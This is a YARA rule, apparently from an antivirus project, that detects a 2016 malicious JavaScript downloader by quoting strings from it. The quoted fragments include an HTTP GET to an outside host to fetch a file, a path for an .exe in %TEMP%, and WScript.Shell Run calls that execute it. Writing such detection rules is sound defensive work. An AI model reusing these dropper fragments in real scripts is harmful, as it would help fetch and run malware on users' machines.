rule sig_20160328_f39d614cbab8e35154d20c649f37c5f8 {
  meta:
    description = "datamaliciousorder - file 20160328_f39d614cbab8e35154d20c649f37c5f8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "db0ad615bb870ba26eb8c67b70a6d56dd3b3ee296d28eab85d3eced0e81197d7"

  strings:
    $s1  = "function Ropgde() {return Yyzmmvoxls[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"At57E24yNcnkxcon.exe\";};" fullword ascii
    $s2  = "Pfeheanwn[Qjvlfz](\"GET\", \"http://gydkym.com/dk3s8sja\", false);" fullword ascii
    $s3  = "function Druicvtgjw(Dlmaobxu, Sodoearjua){return Dlmaobxu - Sodoearjua;};" fullword ascii
    $s4  = "var Yyzmmvoxls = function Voasgktww() {return WScript[Fehmj](\"WScript.Shell\");}();" fullword ascii
    $s5  = "do {WScript[Mjvvnu](Klrcadzgjm() * 11)} while (Pfeheanwn[\"readystate\"] < 4 );" fullword ascii
    $s6  = "function Jpuuye(Xxivltb){Yyzmmvoxls[\"Run\"](Xxivltb, Zjvbeifpg, Zjvbeifpg);};" fullword ascii
    $s7  = "function Aqhfctci() {return ((Mtebqctck == true) && (Mtebqctck == Acnoeml)) ? 1 : Zjvbeifpg;};" fullword ascii
    $s8  = "var Qxymjkhnsq = new this[\"Date\"]();" fullword ascii
    $s9  = "function Vsbqllwqw()" fullword ascii
    $s10 = "var Mtebqctck = false;" fullword ascii
    $s11 = "var Mdecxnbdxl = false;" fullword ascii
    $s12 = "function Egrlik(){return Klfggikg;};" fullword ascii
    $s13 = "Mtebqctck = true; " fullword ascii
    $s14 = "function Fifyvvs(Fjgchh) {var Khualtc = (1, 2, 3, 4, 5, Fjgchh); return Khualtc;};" fullword ascii
    $s15 = "return Druicvtgjw(Madqemac, Zrsjpmvto);" fullword ascii
    $s16 = "var Acnoeml = false;" fullword ascii
    $s17 = " while (Kilhbdhd){" fullword ascii
    $s18 = "function Qvadwl(){return Fehmj;};" fullword ascii
    $s19 = "Acnoeml = true; " fullword ascii
    $s20 = "} catch(Avwhzua){Kilhbdhd = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}